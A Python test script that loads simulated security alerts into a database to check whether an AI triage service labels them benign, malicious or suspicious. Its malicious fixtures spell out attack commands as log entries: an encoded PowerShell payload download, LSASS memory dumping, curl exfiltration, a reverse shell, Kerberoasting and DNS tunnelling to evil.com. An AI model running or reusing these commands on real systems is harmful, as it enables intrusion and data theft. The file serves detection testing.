#!/usr/bin/env python3
"""
Comprehensive Blind AI Test Suite
==================================

Tests ALL features with BLIND scenarios where the AI must analyze evidence,
not read obvious alert names.

Tests:
1. Volume Test - 50+ blind alerts with logs
2. False Positive Test - Benign activities that look suspicious
3. True Positive Test - Real attacks with evidence
4. Edge Cases - Ambiguous scenarios
5. Auto-Close Test - Low severity benign should auto-close
6. Severity Classification - Critical vs Low handling

Usage:
    python scripts/test_comprehensive_blind.py --all
    python scripts/test_comprehensive_blind.py --volume 50
    python scripts/test_comprehensive_blind.py --false-positive
    python scripts/test_comprehensive_blind.py --true-positive
    python scripts/test_comprehensive_blind.py --edge-cases
    python scripts/test_comprehensive_blind.py --check
"""

import os
import sys
import uuid
import random
import argparse
import time
from datetime import datetime, timedelta

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from dotenv import load_dotenv
load_dotenv()

from supabase import create_client
import requests

SUPABASE_URL = os.getenv('SUPABASE_URL')
SUPABASE_KEY = os.getenv('SUPABASE_SERVICE_KEY') or os.getenv('SUPABASE_KEY')
supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

BASE_URL = "http://localhost:5000"

# Track test results
TEST_RESULTS = {
    "created": [],
    "expected_benign": 0,
    "expected_malicious": 0,
    "expected_suspicious": 0
}


def timestamp(minutes_ago=0):
    return (datetime.utcnow() - timedelta(minutes=minutes_ago)).isoformat() + "Z"


def create_test_alert(scenario):
    """Create alert with all associated logs and queue for processing"""
    alert_id = str(uuid.uuid4())
    severity = scenario["alert"].get("severity", "medium")
    severity_class = "CRITICAL_HIGH" if severity in ["critical", "high"] else "MEDIUM_LOW"
    
    alert = {
        "id": alert_id,
        "alert_name": scenario["alert"]["name"],
        "severity": severity,
        "severity_class": severity_class,
        "description": scenario["alert"].get("description", "Activity detected"),
        "source_ip": scenario["alert"].get("source_ip", "10.0.0." + str(random.randint(1, 254))),
        "dest_ip": scenario["alert"].get("dest_ip", "10.0.0.1"),
        "hostname": scenario["alert"].get("hostname", "WORKSTATION-" + str(random.randint(1, 100))),
        "username": scenario["alert"].get("username", "user"),
        "mitre_technique": scenario["alert"].get("mitre", "T1059"),
        "status": "open",
        "created_at": timestamp()
    }
    
    try:
        # Insert alert into database
        supabase.table('alerts').insert(alert).execute()
        
        # Insert logs
        if scenario.get("process_logs"):
            for log in scenario["process_logs"]:
                log["alert_id"] = alert_id
                log["timestamp"] = timestamp(random.randint(1, 5))
            supabase.table('process_logs').insert(scenario["process_logs"]).execute()
        
        if scenario.get("network_logs"):
            for log in scenario["network_logs"]:
                log["alert_id"] = alert_id
                log["timestamp"] = timestamp(random.randint(1, 5))
            supabase.table('network_logs').insert(scenario["network_logs"]).execute()
        
        if scenario.get("file_logs"):
            for log in scenario["file_logs"]:
                log["alert_id"] = alert_id
                log["timestamp"] = timestamp(random.randint(1, 5))
            supabase.table('file_activity_logs').insert(scenario["file_logs"]).execute()
        
        # Queue for AI analysis via reanalyze endpoint
        try:
            requests.post(f"{BASE_URL}/api/alerts/{alert_id}/reanalyze", timeout=5)
        except:
            pass  # Backend might not be running during DB-only tests
        
        return alert_id
    except Exception as e:
        print(f"  [ERROR] {e}")
        return None


# =============================================================================
# BENIGN SCENARIOS POOL (Things that LOOK suspicious but are normal)
# =============================================================================
BENIGN_POOL = [
    # PowerShell that's actually legitimate
    {
        "alert": {
            "name": "PowerShell Execution",
            "severity": "medium",
            "description": "PowerShell process with arguments detected",
            "hostname": "IT-ADMIN-PC",
            "username": "it.admin",
            "mitre": "T1059.001"
        },
        "process_logs": [
            {"process_name": "powershell.exe", "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\IT\\Maintenance\\Update-Software.ps1", "parent_process": "explorer.exe", "username": "it.admin", "hostname": "IT-ADMIN-PC"},
        ],
        "network_logs": [],
        "file_logs": [
            {"action": "FileRead", "file_path": "C:\\IT\\Maintenance\\Update-Software.ps1", "file_name": "Update-Software.ps1", "process_name": "powershell.exe", "username": "it.admin"}
        ],
        "expected": "BENIGN"
    },
    # Scheduled task - legitimate
    {
        "alert": {
            "name": "Scheduled Task Created",
            "severity": "medium",
            "description": "New scheduled task registered",
            "hostname": "WORKSTATION-05",
            "username": "SYSTEM",
            "mitre": "T1053.005"
        },
        "process_logs": [
            {"process_name": "schtasks.exe", "command_line": "schtasks /create /tn \"Adobe Acrobat Update Task\" /tr \"C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\AdobeARM.exe\" /sc daily", "parent_process": "msiexec.exe", "username": "SYSTEM", "hostname": "WORKSTATION-05"},
        ],
        "network_logs": [],
        "file_logs": [],
        "expected": "BENIGN"
    },
    # Network connection to cloud service
    {
        "alert": {
            "name": "Outbound Connection",
            "severity": "low",
            "description": "HTTPS connection to external IP",
            "source_ip": "10.0.0.45",
            "dest_ip": "52.96.166.130",
            "hostname": "EXEC-LAPTOP",
            "username": "ceo",
            "mitre": "T1071.001"
        },
        "process_logs": [
            {"process_name": "OUTLOOK.EXE", "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"", "parent_process": "explorer.exe", "username": "ceo", "hostname": "EXEC-LAPTOP"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.45", "dest_ip": "52.96.166.130", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 5000, "bytes_received": 150000, "service": "Office365"}
        ],
        "file_logs": [],
        "expected": "BENIGN"
    },
    # Remote desktop - IT support
    {
        "alert": {
            "name": "Remote Session",
            "severity": "medium",
            "description": "Remote desktop protocol connection",
            "source_ip": "10.0.0.5",
            "dest_ip": "10.0.0.88",
            "hostname": "IT-HELPDESK-01",
            "username": "helpdesk.tech",
            "mitre": "T1021.001"
        },
        "process_logs": [
            {"process_name": "mstsc.exe", "command_line": "mstsc.exe /v:10.0.0.88", "parent_process": "explorer.exe", "username": "helpdesk.tech", "hostname": "IT-HELPDESK-01"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.5", "dest_ip": "10.0.0.88", "dest_port": 3389, "protocol": "RDP", "bytes_sent": 50000, "bytes_received": 200000, "service": "Remote Desktop"}
        ],
        "file_logs": [],
        "expected": "BENIGN"
    },
    # File share access
    {
        "alert": {
            "name": "Network Share Access",
            "severity": "low",
            "description": "SMB connection to file server",
            "source_ip": "10.0.0.60",
            "dest_ip": "10.0.0.200",
            "hostname": "FINANCE-PC-03",
            "username": "finance.analyst",
            "mitre": "T1021.002"
        },
        "process_logs": [
            {"process_name": "excel.exe", "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"\\\\fileserver\\finance\\Q4-Budget.xlsx\"", "parent_process": "explorer.exe", "username": "finance.analyst", "hostname": "FINANCE-PC-03"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.60", "dest_ip": "10.0.0.200", "dest_port": 445, "protocol": "SMB", "bytes_sent": 1000, "bytes_received": 500000, "service": "File Share"}
        ],
        "file_logs": [
            {"action": "FileRead", "file_path": "\\\\fileserver\\finance\\Q4-Budget.xlsx", "file_name": "Q4-Budget.xlsx", "process_name": "excel.exe", "username": "finance.analyst"}
        ],
        "expected": "BENIGN"
    },
    # Windows service start
    {
        "alert": {
            "name": "Service Started",
            "severity": "low",
            "description": "Windows service process launched",
            "hostname": "SERVER-APP-01",
            "username": "SYSTEM",
            "mitre": "T1543.003"
        },
        "process_logs": [
            {"process_name": "svchost.exe", "command_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule", "parent_process": "services.exe", "username": "SYSTEM", "hostname": "SERVER-APP-01"},
        ],
        "network_logs": [],
        "file_logs": [],
        "expected": "BENIGN"
    },
    # Software installation
    {
        "alert": {
            "name": "Installer Execution",
            "severity": "medium",
            "description": "MSI installer package executed",
            "hostname": "DEV-WORKSTATION-02",
            "username": "developer",
            "mitre": "T1218.007"
        },
        "process_logs": [
            {"process_name": "msiexec.exe", "command_line": "msiexec.exe /i \"C:\\Users\\developer\\Downloads\\vscode-installer.msi\" /qn", "parent_process": "explorer.exe", "username": "developer", "hostname": "DEV-WORKSTATION-02"},
        ],
        "network_logs": [],
        "file_logs": [
            {"action": "FileCreate", "file_path": "C:\\Program Files\\Microsoft VS Code\\Code.exe", "file_name": "Code.exe", "process_name": "msiexec.exe", "username": "developer"}
        ],
        "expected": "BENIGN"
    },
    # Antivirus update
    {
        "alert": {
            "name": "Security Software Activity",
            "severity": "low",
            "description": "Security software network connection",
            "source_ip": "10.0.0.77",
            "dest_ip": "20.190.151.68",
            "hostname": "WORKSTATION-12",
            "username": "SYSTEM",
            "mitre": "T1071.001"
        },
        "process_logs": [
            {"process_name": "MsMpEng.exe", "command_line": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2311.6-0\\MsMpEng.exe\"", "parent_process": "services.exe", "username": "SYSTEM", "hostname": "WORKSTATION-12"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.77", "dest_ip": "20.190.151.68", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 2000, "bytes_received": 5000000, "service": "Windows Defender Update"}
        ],
        "file_logs": [],
        "expected": "BENIGN"
    },
    # Backup software
    {
        "alert": {
            "name": "Large File Operation",
            "severity": "medium",
            "description": "Process accessing many files rapidly",
            "hostname": "BACKUP-SERVER",
            "username": "backup.svc",
            "mitre": "T1005"
        },
        "process_logs": [
            {"process_name": "VeeamAgent.exe", "command_line": "\"C:\\Program Files\\Veeam\\Endpoint Backup\\VeeamAgent.exe\" --backup --job \"Daily Backup\"", "parent_process": "services.exe", "username": "backup.svc", "hostname": "BACKUP-SERVER"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.250", "dest_ip": "10.0.0.251", "dest_port": 10006, "protocol": "TCP", "bytes_sent": 50000000000, "bytes_received": 1000000, "service": "Veeam Backup"}
        ],
        "file_logs": [],
        "expected": "BENIGN"
    },
    # Print spooler
    {
        "alert": {
            "name": "Spooler Activity",
            "severity": "low",
            "description": "Print spooler service activity",
            "hostname": "PRINT-SERVER",
            "username": "SYSTEM",
            "mitre": "T1489"
        },
        "process_logs": [
            {"process_name": "spoolsv.exe", "command_line": "C:\\Windows\\System32\\spoolsv.exe", "parent_process": "services.exe", "username": "SYSTEM", "hostname": "PRINT-SERVER"},
        ],
        "network_logs": [],
        "file_logs": [
            {"action": "FileCreate", "file_path": "C:\\Windows\\System32\\spool\\PRINTERS\\00001.SPL", "file_name": "00001.SPL", "process_name": "spoolsv.exe", "username": "SYSTEM"}
        ],
        "expected": "BENIGN"
    },
]

# =============================================================================
# MALICIOUS SCENARIOS POOL (Real attack techniques with evidence)
# =============================================================================
MALICIOUS_POOL = [
    # Encoded PowerShell download
    {
        "alert": {
            "name": "PowerShell Execution",
            "severity": "high",
            "description": "PowerShell process with arguments detected",
            "hostname": "VICTIM-PC-01",
            "username": "sales.user",
            "source_ip": "10.0.0.99",
            "dest_ip": "185.220.101.45",
            "mitre": "T1059.001"
        },
        "process_logs": [
            {"process_name": "powershell.exe", "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADQANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA", "parent_process": "winword.exe", "username": "sales.user", "hostname": "VICTIM-PC-01"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.99", "dest_ip": "185.220.101.45", "dest_port": 80, "protocol": "HTTP", "bytes_sent": 500, "bytes_received": 45000, "service": "Unknown"}
        ],
        "file_logs": [
            {"action": "FileCreate", "file_path": "C:\\Users\\sales.user\\AppData\\Local\\Temp\\payload.ps1", "file_name": "payload.ps1", "process_name": "powershell.exe", "username": "sales.user"}
        ],
        "expected": "MALICIOUS"
    },
    # Credential dumping
    {
        "alert": {
            "name": "Process Execution",
            "severity": "critical",
            "description": "Process accessing sensitive system memory",
            "hostname": "DC-PRIMARY",
            "username": "admin",
            "mitre": "T1003.001"
        },
        "process_logs": [
            {"process_name": "rundll32.exe", "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\dump.dmp full", "parent_process": "cmd.exe", "username": "admin", "hostname": "DC-PRIMARY"},
            {"process_name": "cmd.exe", "command_line": "cmd.exe /c rundll32 comsvcs.dll MiniDump 624 dump.dmp full", "parent_process": "powershell.exe", "username": "admin", "hostname": "DC-PRIMARY"},
        ],
        "network_logs": [],
        "file_logs": [
            {"action": "FileCreate", "file_path": "C:\\Windows\\Temp\\dump.dmp", "file_name": "dump.dmp", "process_name": "rundll32.exe", "username": "admin"}
        ],
        "expected": "MALICIOUS"
    },
    # Data exfiltration
    {
        "alert": {
            "name": "Outbound Connection",
            "severity": "high",
            "description": "Large data transfer to external IP",
            "source_ip": "10.0.0.120",
            "dest_ip": "23.129.64.10",
            "hostname": "RESEARCH-SERVER",
            "username": "researcher",
            "mitre": "T1041"
        },
        "process_logs": [
            {"process_name": "curl.exe", "command_line": "curl.exe --upload-file C:\\Projects\\classified\\design.zip https://23.129.64.10:443/upload", "parent_process": "cmd.exe", "username": "researcher", "hostname": "RESEARCH-SERVER"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.120", "dest_ip": "23.129.64.10", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 104857600, "bytes_received": 1024, "service": "Unknown"}
        ],
        "file_logs": [
            {"action": "FileRead", "file_path": "C:\\Projects\\classified\\design.zip", "file_name": "design.zip", "process_name": "curl.exe", "username": "researcher"}
        ],
        "expected": "MALICIOUS"
    },
    # Ransomware activity
    {
        "alert": {
            "name": "File System Activity",
            "severity": "critical",
            "description": "Rapid file modifications detected",
            "hostname": "FINANCE-WS-01",
            "username": "accountant",
            "mitre": "T1486"
        },
        "process_logs": [
            {"process_name": "svchost.exe", "command_line": "C:\\Users\\Public\\Downloads\\svchost.exe --encrypt-all --ext .locked", "parent_process": "explorer.exe", "username": "accountant", "hostname": "FINANCE-WS-01"},
        ],
        "network_logs": [],
        "file_logs": [
            {"action": "FileModify", "file_path": "C:\\Users\\accountant\\Documents\\Taxes_2025.xlsx.locked", "file_name": "Taxes_2025.xlsx.locked", "process_name": "svchost.exe", "username": "accountant"},
            {"action": "FileModify", "file_path": "C:\\Users\\accountant\\Documents\\Payroll.docx.locked", "file_name": "Payroll.docx.locked", "process_name": "svchost.exe", "username": "accountant"},
            {"action": "FileCreate", "file_path": "C:\\Users\\accountant\\Desktop\\HOW_TO_DECRYPT.txt", "file_name": "HOW_TO_DECRYPT.txt", "process_name": "svchost.exe", "username": "accountant"},
        ],
        "expected": "MALICIOUS"
    },
    # Lateral movement - PsExec
    {
        "alert": {
            "name": "Remote Execution",
            "severity": "high",
            "description": "Remote service installation detected",
            "source_ip": "10.0.0.50",
            "dest_ip": "10.0.0.101",
            "hostname": "INFECTED-PC",
            "username": "admin",
            "mitre": "T1570"
        },
        "process_logs": [
            {"process_name": "psexec.exe", "command_line": "psexec.exe \\\\10.0.0.101 -u admin -p password123 cmd.exe /c whoami", "parent_process": "cmd.exe", "username": "admin", "hostname": "INFECTED-PC"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.50", "dest_ip": "10.0.0.101", "dest_port": 445, "protocol": "SMB", "bytes_sent": 50000, "bytes_received": 10000, "service": "PSEXESVC"}
        ],
        "file_logs": [],
        "expected": "MALICIOUS"
    },
    # Persistence via registry
    {
        "alert": {
            "name": "Registry Modification",
            "severity": "high",
            "description": "Registry run key modified",
            "hostname": "WORKSTATION-22",
            "username": "user",
            "mitre": "T1547.001"
        },
        "process_logs": [
            {"process_name": "reg.exe", "command_line": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d C:\\Users\\Public\\update.exe /f", "parent_process": "powershell.exe", "username": "user", "hostname": "WORKSTATION-22"},
        ],
        "network_logs": [],
        "file_logs": [
            {"action": "FileCreate", "file_path": "C:\\Users\\Public\\update.exe", "file_name": "update.exe", "process_name": "powershell.exe", "username": "user"}
        ],
        "expected": "MALICIOUS"
    },
    # Reverse shell
    {
        "alert": {
            "name": "Network Connection",
            "severity": "high",
            "description": "Unusual outbound connection pattern",
            "source_ip": "10.0.0.88",
            "dest_ip": "45.33.32.156",
            "hostname": "DEV-PC",
            "username": "developer",
            "mitre": "T1059.001"
        },
        "process_logs": [
            {"process_name": "powershell.exe", "command_line": "powershell.exe -c \"$client = New-Object System.Net.Sockets.TCPClient('45.33.32.156',4444);$stream = $client.GetStream();\"", "parent_process": "cmd.exe", "username": "developer", "hostname": "DEV-PC"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.88", "dest_ip": "45.33.32.156", "dest_port": 4444, "protocol": "TCP", "bytes_sent": 50000, "bytes_received": 100000, "service": "Unknown"}
        ],
        "file_logs": [],
        "expected": "MALICIOUS"
    },
    # Kerberoasting
    {
        "alert": {
            "name": "Service Ticket Request",
            "severity": "high",
            "description": "Multiple service ticket requests detected",
            "hostname": "ATTACKER-PC",
            "username": "compromised.user",
            "mitre": "T1558.003"
        },
        "process_logs": [
            {"process_name": "powershell.exe", "command_line": "powershell.exe -c \"Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/sql.domain.local'\"", "parent_process": "cmd.exe", "username": "compromised.user", "hostname": "ATTACKER-PC"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.150", "dest_ip": "10.0.0.1", "dest_port": 88, "protocol": "Kerberos", "bytes_sent": 5000, "bytes_received": 15000, "service": "KDC"}
        ],
        "file_logs": [
            {"action": "FileCreate", "file_path": "C:\\Users\\compromised.user\\tickets.kirbi", "file_name": "tickets.kirbi", "process_name": "powershell.exe", "username": "compromised.user"}
        ],
        "expected": "MALICIOUS"
    },
    # DNS tunneling
    {
        "alert": {
            "name": "DNS Activity",
            "severity": "high",
            "description": "Unusual DNS query pattern",
            "source_ip": "10.0.0.130",
            "dest_ip": "8.8.8.8",
            "hostname": "COMPROMISED-SERVER",
            "username": "SYSTEM",
            "mitre": "T1048.003"
        },
        "process_logs": [
            {"process_name": "dnscat2.exe", "command_line": "C:\\Windows\\Temp\\dnscat2.exe --dns server=evil.com", "parent_process": "powershell.exe", "username": "SYSTEM", "hostname": "COMPROMISED-SERVER"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.130", "dest_ip": "8.8.8.8", "dest_port": 53, "protocol": "DNS", "bytes_sent": 500000, "bytes_received": 600000, "service": "DNS Tunnel"}
        ],
        "file_logs": [],
        "expected": "MALICIOUS"
    },
    # Cobalt Strike beacon
    {
        "alert": {
            "name": "Network Beacon",
            "severity": "critical",
            "description": "Periodic outbound connections detected",
            "source_ip": "10.0.0.77",
            "dest_ip": "192.168.100.1",
            "hostname": "COMPROMISED-WS",
            "username": "user",
            "mitre": "T1071.001"
        },
        "process_logs": [
            {"process_name": "rundll32.exe", "command_line": "rundll32.exe C:\\Users\\user\\AppData\\Local\\Temp\\beacon.dll,Start", "parent_process": "explorer.exe", "username": "user", "hostname": "COMPROMISED-WS"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.77", "dest_ip": "192.168.100.1", "dest_port": 443, "protocol": "HTTPS", "bytes_sent": 1000, "bytes_received": 5000, "service": "C2 Beacon"}
        ],
        "file_logs": [
            {"action": "FileCreate", "file_path": "C:\\Users\\user\\AppData\\Local\\Temp\\beacon.dll", "file_name": "beacon.dll", "process_name": "powershell.exe", "username": "user"}
        ],
        "expected": "MALICIOUS"
    },
]

# =============================================================================
# EDGE CASES (Ambiguous - could go either way)
# =============================================================================
EDGE_CASES = [
    # Admin using PsExec legitimately
    {
        "alert": {
            "name": "Remote Administration",
            "severity": "medium",
            "description": "Remote administration tool used",
            "source_ip": "10.0.0.5",
            "dest_ip": "10.0.0.100",
            "hostname": "IT-ADMIN-WS",
            "username": "it.admin",
            "mitre": "T1570"
        },
        "process_logs": [
            {"process_name": "psexec.exe", "command_line": "psexec.exe \\\\10.0.0.100 -s cmd.exe /c ipconfig /all", "parent_process": "cmd.exe", "username": "it.admin", "hostname": "IT-ADMIN-WS"},
        ],
        "network_logs": [
            {"source_ip": "10.0.0.5", "dest_ip": "10.0.0.100", "dest_port": 445, "protocol": "SMB", "bytes_sent": 5000, "bytes_received": 2000, "service": "Admin"}
        ],
        "file_logs": [],
        "expected": "SUSPICIOUS"
    },
    # PowerShell with encoded but legitimate command
    {
        "alert": {
            "name": "PowerShell Execution",
            "severity": "medium",
            "description": "Encoded PowerShell command",
            "hostname": "BUILD-SERVER",
            "username": "build.svc",
            "mitre": "T1059.001"
        },
        "process_logs": [
            {"process_name": "powershell.exe", "command_line": "powershell.exe -enc RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcAFAAcgBvAGoAZQBjAHQAcwA=", "parent_process": "jenkins.exe", "username": "build.svc", "hostname": "BUILD-SERVER"},
        ],
        "network_logs": [],
        "file_logs": [],
        "expected": "SUSPICIOUS"
    },
]


def run_volume_test(count=50):
    """Run volume test with mixed blind scenarios"""
    print("\n" + "="*80)
    print(f"VOLUME TEST: {count} BLIND ALERTS")
    print("="*80)
    print("Creating mixed benign/malicious scenarios with logs...")
    print("-"*80)
    
    all_scenarios = BENIGN_POOL + MALICIOUS_POOL
    created = 0
    benign = 0
    malicious = 0
    
    for i in range(count):
        scenario = random.choice(all_scenarios).copy()
        # Make each unique
        scenario["alert"]["name"] = f"[Vol-{i+1}] {scenario['alert']['name']}"
        
        alert_id = create_test_alert(scenario)
        if alert_id:
            created += 1
            if scenario["expected"] == "BENIGN":
                benign += 1
            else:
                malicious += 1
            
            if i % 10 == 0:
                print(f"  Progress: {i+1}/{count}...")
        
        time.sleep(0.2)
    
    print("-"*80)
    print(f"Created: {created} alerts")
    print(f"  Expected BENIGN: {benign}")
    print(f"  Expected MALICIOUS: {malicious}")
    print("="*80)


def run_false_positive_test():
    """Test benign activities that look suspicious"""
    print("\n" + "="*80)
    print("FALSE POSITIVE TEST")
    print("="*80)
    print("These are BENIGN activities that might look suspicious.")
    print("AI should correctly identify them as BENIGN.")
    print("-"*80)
    
    for i, scenario in enumerate(BENIGN_POOL):
        scenario_copy = scenario.copy()
        scenario_copy["alert"]["name"] = f"[FP-{i+1}] {scenario['alert']['name']}"
        alert_id = create_test_alert(scenario_copy)
        if alert_id:
            print(f"  [CREATED] {scenario_copy['alert']['name'][:60]}")
        time.sleep(0.3)
    
    print("-"*80)
    print(f"Created: {len(BENIGN_POOL)} false positive test cases")
    print("="*80)


def run_true_positive_test():
    """Test real malicious activities"""
    print("\n" + "="*80)
    print("TRUE POSITIVE TEST")
    print("="*80)
    print("These are MALICIOUS activities with clear evidence.")
    print("AI should correctly identify them as MALICIOUS.")
    print("-"*80)
    
    for i, scenario in enumerate(MALICIOUS_POOL):
        scenario_copy = scenario.copy()
        scenario_copy["alert"]["name"] = f"[TP-{i+1}] {scenario['alert']['name']}"
        alert_id = create_test_alert(scenario_copy)
        if alert_id:
            print(f"  [CREATED] {scenario_copy['alert']['name'][:60]}")
        time.sleep(0.3)
    
    print("-"*80)
    print(f"Created: {len(MALICIOUS_POOL)} true positive test cases")
    print("="*80)


def run_edge_case_test():
    """Test ambiguous scenarios"""
    print("\n" + "="*80)
    print("EDGE CASE TEST")
    print("="*80)
    print("These are AMBIGUOUS scenarios that require careful analysis.")
    print("-"*80)
    
    for i, scenario in enumerate(EDGE_CASES):
        scenario_copy = scenario.copy()
        scenario_copy["alert"]["name"] = f"[EDGE-{i+1}] {scenario['alert']['name']}"
        alert_id = create_test_alert(scenario_copy)
        if alert_id:
            print(f"  [CREATED] {scenario_copy['alert']['name'][:60]}")
        time.sleep(0.3)
    
    print("-"*80)
    print(f"Created: {len(EDGE_CASES)} edge case test cases")
    print("="*80)


def check_results():
    """Check AI verdicts"""
    print("\n" + "="*80)
    print("AI VERDICT RESULTS")
    print("="*80)
    
    try:
        response = supabase.table('alerts').select('*').order('created_at', desc=True).limit(50).execute()
        alerts = response.data
        
        benign = malicious = suspicious = pending = error = 0
        
        print(f"\n{'Alert Name':<50} | {'Verdict':<12} | {'Conf':<6}")
        print("-"*75)
        
        for alert in alerts:
            name = alert.get('alert_name', 'Unknown')[:50]
            verdict = alert.get('ai_verdict', 'PENDING')
            conf = alert.get('ai_confidence', 0)
            
            if verdict == 'BENIGN':
                benign += 1
            elif verdict == 'MALICIOUS':
                malicious += 1
            elif verdict == 'SUSPICIOUS':
                suspicious += 1
            elif verdict == 'ERROR':
                error += 1
            else:
                pending += 1
            
            conf_str = f"{conf*100:.0f}%" if conf else "-"
            print(f"{name:<50} | {verdict:<12} | {conf_str:<6}")
        
        print("-"*75)
        print(f"\nSUMMARY:")
        print(f"  BENIGN:     {benign}")
        print(f"  MALICIOUS:  {malicious}")
        print(f"  SUSPICIOUS: {suspicious}")
        print(f"  ERROR:      {error}")
        print(f"  PENDING:    {pending}")
        print("="*80)
        
    except Exception as e:
        print(f"[ERROR] {e}")


def main():
    parser = argparse.ArgumentParser(description='Comprehensive Blind AI Test')
    parser.add_argument('--volume', type=int, metavar='N', help='Volume test with N alerts')
    parser.add_argument('--false-positive', action='store_true', help='False positive test')
    parser.add_argument('--true-positive', action='store_true', help='True positive test')
    parser.add_argument('--edge-cases', action='store_true', help='Edge case test')
    parser.add_argument('--check', action='store_true', help='Check results')
    parser.add_argument('--all', action='store_true', help='Run all tests')
    
    args = parser.parse_args()
    
    print("\n" + "="*80)
    print("COMPREHENSIVE BLIND AI TEST SUITE")
    print("="*80)
    print("All tests use NEUTRAL alert names. AI must analyze logs.")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*80)
    
    if args.check:
        check_results()
        return
    
    # Check backend
    try:
        requests.get(f"{BASE_URL}/queue-status", timeout=5)
        print("[OK] Backend is running")
    except:
        print("[WARNING] Backend not running - creating alerts but no analysis")
    
    if args.all:
        run_false_positive_test()
        time.sleep(1)
        run_true_positive_test()
        time.sleep(1)
        run_edge_case_test()
        time.sleep(1)
        run_volume_test(30)
    else:
        if args.false_positive:
            run_false_positive_test()
        if args.true_positive:
            run_true_positive_test()
        if args.edge_cases:
            run_edge_case_test()
        if args.volume:
            run_volume_test(args.volume)
    
    print("\n" + "="*80)
    print("TESTS CREATED")
    print("="*80)
    print("\nWait for AI analysis, then check results:")
    print("  python scripts/test_comprehensive_blind.py --check")
    print("="*80)


if __name__ == '__main__':
    main()
